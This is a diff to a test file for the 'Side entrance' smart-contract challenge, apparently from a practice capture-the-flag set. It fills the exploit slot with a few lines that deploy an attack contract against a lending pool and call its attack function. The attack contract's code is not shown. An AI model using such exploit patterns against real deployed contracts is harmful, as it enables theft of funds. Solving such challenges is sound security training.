@@ -16,6 +16,7 @@ describe('[Challenge] Side entrance', function () {
         
         await this.pool.deposit({ value: ETHER_IN_POOL });
 
+      
         this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);
 
         expect(
@@ -25,6 +26,11 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const attackFactory = await ethers.getContractFactory('AttackContract',attacker);
+        this.attackContract = await attackFactory.deploy(this.pool.address);
+
+
+        this.attackContract.connect(attacker).attack(ETHER_IN_POOL);
     });
 
     after(async function () {
